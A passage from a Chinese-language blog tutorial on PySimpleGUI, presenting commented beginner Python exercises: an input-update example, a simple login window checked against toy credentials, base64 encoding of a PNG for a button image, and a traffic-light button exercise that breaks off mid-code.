class=\"string\">&#x27;dsfg&#x27;</span>) <span class=\"comment\"># 用于更新悬浮文本</span></span><br><span class=\"line\">        window[<span class=\"string\">&#x27;d&#x27;</span>].update(</span><br><span class=\"line\">            value=<span class=\"string\">&#x27;123&#x27;</span>, <span class=\"comment\"># str：更新输入框的文本</span></span><br><span class=\"line\">            disabled=<span class=\"literal\">None</span>, <span class=\"comment\"># bool: 更新元素的禁用状态，如果为True，输入框变成只读状态，无法写入</span></span><br><span class=\"line\">            select=<span class=\"literal\">None</span>,  <span class=\"comment\"># bool：元素选中，如果为True，输入框内的文本被全选中</span></span><br><span class=\"line\">                            <span class=\"comment\"># 和focus或者set_focus一起使用</span></span><br><span class=\"line\">            visible=<span class=\"literal\">None</span>,   <span class=\"comment\"># bool：更新元素的可见状态</span></span><br><span class=\"line\">            text_color=<span class=\"literal\">None</span>,    <span class=\"comment\"># str：更新输入框内的文本颜色</span></span><br><span class=\"line\">            background_color=<span class=\"literal\">None</span>,  <span class=\"comment\"># str：更新输入框的背景颜色</span></span><br><span class=\"line\">            move_cursor_to=<span class=\"string\">&quot;end&quot;</span>    <span class=\"comment\"># 光标移动文本的最后，和value,focus一起使用</span></span><br><span class=\"line\"></span><br><span class=\"line\">        )</span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"12练习-编写一个登陆窗口-py\"><a href=\"#12练习-编写一个登陆窗口-py\" class=\"headerlink\" title=\"12练习-编写一个登陆窗口.py\"></a>12练习-编写一个登陆窗口.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">要求：</span></span><br><span class=\"line\"><span class=\"string\">1.用字典嵌套列表的形式，建立用户数据</span></span><br><span class=\"line\"><span class=\"string\">2.实现用户输入用户名和密码后，判断输入是否正确</span></span><br><span class=\"line\"><span class=\"string\">3.确认后，弹出窗口“输入正确”或“输入错误”</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 导入库</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">userdata=&#123;<span class=\"string\">&#x27;username&#x27;</span>:[<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"string\">&#x27;c&#x27;</span>,<span class=\"string\">&#x27;d&#x27;</span>,<span class=\"string\">&#x27;e&#x27;</span>,<span class=\"string\">&#x27;f&#x27;</span>,<span class=\"string\">&#x27;g&#x27;</span>],</span><br><span class=\"line\"><span class=\"string\">&#x27;password&#x27;</span>:[<span class=\"string\">&#x27;11&#x27;</span>,<span class=\"string\">&#x27;22&#x27;</span>,<span class=\"string\">&#x27;33&#x27;</span>,<span class=\"string\">&#x27;44&#x27;</span>,<span class=\"string\">&#x27;55&#x27;</span>,<span class=\"string\">&#x27;66&#x27;</span>,<span class=\"string\">&#x27;77&#x27;</span>]&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 定义布局，确定行数</span></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;用户名&#x27;</span>,size=(<span class=\"number\">8</span>,<span class=\"number\">1</span>)),sg.InputText(<span class=\"string\">&#x27;请输入用户名&#x27;</span>,key=<span class=\"string\">&#x27;-name-&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;密码&#x27;</span>,size=(<span class=\"number\">8</span>,<span class=\"number\">1</span>)),sg.InputText(<span class=\"string\">&#x27;&#x27;</span>,key=<span class=\"string\">&#x27;-pwd-&#x27;</span>,password_char=<span class=\"string\">&#x27;*&#x27;</span>,tooltip=<span class=\"string\">&#x27;密码为两位数字&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Button(<span class=\"string\">&#x27;确认&#x27;</span>),sg.Button(<span class=\"string\">&#x27;取消&#x27;</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 创建窗口</span></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python练习窗&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. 事件循环</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,value=window.read() <span class=\"comment\"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:  <span class=\"comment\"># 窗口关闭事件</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"string\">&#x27;确认&#x27;</span>:</span><br><span class=\"line\">        i=<span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> i &lt; <span class=\"built_in\">len</span>(userdata[<span class=\"string\">&#x27;username&#x27;</span>]):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> value[<span class=\"string\">&#x27;-name-&#x27;</span>] == userdata[<span class=\"string\">&#x27;username&#x27;</span>][i]:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> value[<span class=\"string\">&#x27;-pwd-&#x27;</span>] == userdata[<span class=\"string\">&#x27;password&#x27;</span>][i]:</span><br><span class=\"line\">                    sg.Popup(<span class=\"string\">&#x27;输入正确&#x27;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            i += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            sg.Popup(<span class=\"string\">&#x27;输入错误&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5. 关闭窗口</span></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"13-图片base64格式编码-py\"><a href=\"#13-图片base64格式编码-py\" class=\"headerlink\" title=\"13-图片base64格式编码.py\"></a>13-图片base64格式编码.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">f = <span class=\"built_in\">open</span>(<span class=\"string\">r&quot;c:\\bl3.png&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>)</span><br><span class=\"line\">res = f.read()</span><br><span class=\"line\">s = base64.b64encode(res)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s)</span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"13按键元素的设定及更新方法-py\"><a href=\"#13按键元素的设定及更新方法-py\" class=\"headerlink\" title=\"13按键元素的设定及更新方法.py\"></a>13按键元素的设定及更新方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">按键元素的设定方法</span></span><br><span class=\"line\"><span class=\"string\">按键元素的书写方法：</span></span><br><span class=\"line\"><span class=\"string\">sg.B(&#x27;&#x27;)    sg.Button(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">按键元素的设定方法：</span></span><br><span class=\"line\"><span class=\"string\">sg.B(&#x27;确定&#x27;,image_filename=r&#x27;图片路径&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">按键元素的更新方法</span></span><br><span class=\"line\"><span class=\"string\">window[key].Update()</span></span><br><span class=\"line\"><span class=\"string\">window[key].update()</span></span><br><span class=\"line\"><span class=\"string\">Button(</span></span><br><span class=\"line\"><span class=\"string\">    button_text=&quot;&quot;, # 显示在按钮上的文本</span></span><br><span class=\"line\"><span class=\"string\">    key=None,   # 元素的唯一标识符</span></span><br><span class=\"line\"><span class=\"string\">    tooltip=None,   # 悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">    disabled=False, # 元素禁用设定，如果为True，点击按钮也无法发生事件。</span></span><br><span class=\"line\"><span class=\"string\">    image_filename=None,    # 图片路径，按钮用图片表示，只支持GIFs和PNG格式，和image_data二选一使用</span></span><br><span class=\"line\"><span class=\"string\">    image_data=None,    #   图片base64格式。按钮用图片显示，和image_filename二选一使用</span></span><br><span class=\"line\"><span class=\"string\">    image_size=(None,None), # 按钮图片大小</span></span><br><span class=\"line\"><span class=\"string\">    image_subsample=None,   # 图片大小设定，为2时，原图片的二分之一大小，2=1/2，3=1/3，4=1/4，etc</span></span><br><span class=\"line\"><span class=\"string\">    border_width=None,  # 按钮边界线设定</span></span><br><span class=\"line\"><span class=\"string\">    size=(None,None),   # 按钮尺寸设定</span></span><br><span class=\"line\"><span class=\"string\">    auto_size_button=None,  # 按钮上的文本自动调节</span></span><br><span class=\"line\"><span class=\"string\">    button_color=None,  # 按钮颜色</span></span><br><span class=\"line\"><span class=\"string\">    disabled_button_color=None,    # 按钮元素禁用时显示的按钮颜色</span></span><br><span class=\"line\"><span class=\"string\">    font=None,  #   字体名称，大小设定</span></span><br><span class=\"line\"><span class=\"string\">    bind_return_key=False,  #  绑定回车键，如果设定为True，回车键会使此元素被点击</span></span><br><span class=\"line\"><span class=\"string\">    focus=False,    # 焦点设置</span></span><br><span class=\"line\"><span class=\"string\">    pad=None,   #   和其他元素之间间隔设定</span></span><br><span class=\"line\"><span class=\"string\">    visible=True, # 元素的可见状态设定，如果为True，元素则不可见</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Update(</span></span><br><span class=\"line\"><span class=\"string\">    text=None,  # 按钮上显示的文本</span></span><br><span class=\"line\"><span class=\"string\">    button_color=(None,None),   # 按钮颜色</span></span><br><span class=\"line\"><span class=\"string\">    disabled=None,  # 元素禁用设定</span></span><br><span class=\"line\"><span class=\"string\">    image_data=None,    # 图片的base64格式</span></span><br><span class=\"line\"><span class=\"string\">    image_filename=None,    # 图片的路径</span></span><br><span class=\"line\"><span class=\"string\">    visible=None,   #   元素可见状态设定</span></span><br><span class=\"line\"><span class=\"string\">    image_subsample=None,   # 元素大小设定</span></span><br><span class=\"line\"><span class=\"string\">    disabled_button_color=(None,None), # 元素禁用时显示的文本和按钮颜色</span></span><br><span class=\"line\"><span class=\"string\">    image_size=None     # 图片尺寸设定</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">image=<span class=\"string\">b&#x27;iVBORw0KGgoAAAANSUhEUgAAANwAAABpCAYAAABRXU1HAAAACXBIWXMAAA9hAAAPYQGoP6dpAAAF8WlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDggNzkuMTY0MDM2LCAyMDE5LzA4LzEzLTAxOjA2OjU3ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjEuMCAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDIyLTAyLTEzVDIzOjQwOjAyKzA4OjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDIyLTAyLTEzVDIzOjQwOjAyKzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAyMi0wMi0xM1QyMzo0MDowMiswODowMCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDplMDZiNWJlNy1jOWE3LThkNDMtOWFlZi0wN2QwZjEzZWJhNDkiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDpjMTZlZmI4YS00ODcyLTYyNGUtOTgxYi0wYTg5YjRjMzhkYTMiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpmMzFhNTc3Ni01MWE4LTViNGYtYjgzNS01MjVlZjMxYmQyMTkiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIiBwaG90b3Nob3A6SUNDUHJvZmlsZT0ic1JHQiBJRUM2MTk2Ni0yLjEiPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjcmVhdGVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOmYzMWE1Nzc2LTUxYTgtNWI0Zi1iODM1LTUyNWVmMzFiZDIxOSIgc3RFdnQ6d2hlbj0iMjAyMi0wMi0xM1QyMzo0MDowMiswODowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDplMDZiNWJlNy1jOWE3LThkNDMtOWFlZi0wN2QwZjEzZWJhNDkiIHN0RXZ0OndoZW49IjIwMjItMDItMTNUMjM6NDA6MDIrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCAyMS4wIChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz756CkcAAAQKklEQVR4nO2de4xdRR3HP9vubrul7ZZCH7TUFikUqaHFF5AovgAJ8YERUUIUIfCHUfEPDGrURCMmYpTEaDDxGSUqoKiIPFpeFRSwD1wsr/IoLVD6oC+27Xa3j13/+N2TO2d2Zs45e++dPWf7+yRN770z99zZc853fr/5zW/mtA0NDaEoShzGjXYDFOVIQgWnKBFRwSlKRFRwihIRFZyiREQFpygRUcEpSkRUcIoSERWcokREBacoEVHBKUpEVHCKEhEVnKJERAWnKBFRwSlKRFRw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&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># layout=[[sg.B(image_filename=r&#x27;c:\\bl.png&#x27;,key=&#x27;-python-&#x27;)]]</span></span><br><span class=\"line\">layout=[[sg.B(image_data=image,key=<span class=\"string\">&#x27;-python-&#x27;</span>,bind_return_key=<span class=\"literal\">True</span>)]]</span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python练习窗&#x27;</span>,layout,keep_on_top=<span class=\"literal\">True</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,value=window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"14编写一个红绿灯（按键练习）-py\"><a href=\"#14编写一个红绿灯（按键练习）-py\" class=\"headerlink\" title=\"14编写一个红绿灯（按键练习）.py\"></a>14编写一个红绿灯（按键练习）.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">要求：</span></span><br><span class=\"line\"><span class=\"string\">1.窗口有三个按键，绿灯，黄灯，红灯</span></span><br><span class=\"line\"><span class=\"string\">2.利用元素更新的方法</span></span><br><span class=\"line\"><span class=\"string\">3.实现按下一个灯，另外两个灯熄灭（变灰色）</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">[sg.B(<span class=\"string\">&#x27;绿灯&#x27;</span>,key=<span class=\"string\">&#x27;-green-&#x27;</span>,button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;green&#x27;</span>),size=(<span class=\"number\">30</span>,<span class=\"number\">9</span>))],</span><br><span class=\"line\">[sg.B(<span class=\"string\">&#x27;黄灯&#x27;</span>,key=<span class=\"string\">&#x27;-yellow-&#x27;</span>,button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;yellow&#x27;</span>),size=(<span class=\"number\">30</span>,<span class=\"number\">9</span>))],</span><br><span class=\"line\">[sg.B(<span class=\"string\">&#x27;红灯&#x27;</span>,key=<span class=\"string\">&#x27;-red-&#x27;</span>,button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;red&#x27;</span>),size=(<span class=\"number\">30</span>,<span class=\"number\">9</span>))],</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;红绿灯&#x27;</span>,layout)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,value=window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;-green-&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-green-&#x27;</span>].update(button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;green&#x27;</span>))</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-yellow-&#x27;</span>].update(button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;grey&#x27;</span>))</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-red-&#x27;</span>].update(button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;grey&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;-yellow-&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-green-&#x27;</span>].update(button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span 